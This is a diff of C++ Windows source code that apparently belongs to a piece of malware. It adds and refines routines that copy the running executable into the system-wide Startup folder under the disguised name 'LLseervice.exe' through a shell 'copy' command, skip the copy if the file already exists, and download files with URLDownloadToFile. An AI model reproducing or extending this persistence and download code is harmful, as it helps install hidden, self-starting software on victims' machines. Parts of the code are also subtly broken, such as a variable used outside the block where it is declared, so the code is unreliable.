@@ -16,6 +16,7 @@
 #include <vector>
 #include <wininet.h>
 #include <sys/stat.h>
+#include <shlwapi.h>
 
 #pragma comment(lib, "Urlmon.lib")
 
@@ -74,11 +75,16 @@ namespace IO
     std::string getFileNameWithPath(){
         char szExeFileName[MAX_PATH];
         GetModuleFileName(NULL, szExeFileName, MAX_PATH);
-        std::string::size_type pos = std::string( szExeFileName ).find_last_of( "\\/" );
-        return std::string( szExeFileName ).substr( 0, pos);
+        //std::string::size_type pos = std::string( szExeFileName ).find_last_of( "\\/" );
+        return std::string( szExeFileName );//.substr( 0, pos);
 
     }
+    std::string getFileName(){
 
+        std::string csPath = getFileNameWithPath();
+        std::string FileName = PathFindFileName(csPath.c_str());
+        return FileName;
+    }
     bool copy(std::string path,std::string filename){
 
         //get self name
@@ -121,7 +127,7 @@ namespace IO
 
     bool copy_w_cmd(std::string path,std::string filename){
         std::string cur_path_filename = getFileNameWithPath();
-        std::string command = "cp "+cur_path_filename+" "+path+filename;
+        std::string command = "copy "+cur_path_filename+" "+path+filename;
         try {
             system(command.c_str());
         } catch (std::exception const& e) {
@@ -151,7 +157,8 @@ namespace IO
         HRESULT res = URLDownloadToFile(NULL, urlfile, despath, 0, NULL);
         if(res == S_OK) {
             return true;
-        } else if(res == E_OUTOFMEMORY) {
+        } else
+        if(res == E_OUTOFMEMORY) {
             return false;
 
         } /*else if(res == INET_E_DOWNLOAD_FAILURE) {
@@ -202,6 +209,9 @@ namespace IO
             std::string path = " C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
             std::string filename = "LLseervice.exe";
             std::string fullpath = path + filename;
+        }
+        if (IO::exists_file(fullpath)){
+            return false;
         }
         if (!(IO::copy_w_cmd(path, filename))) {
             //do copy 2
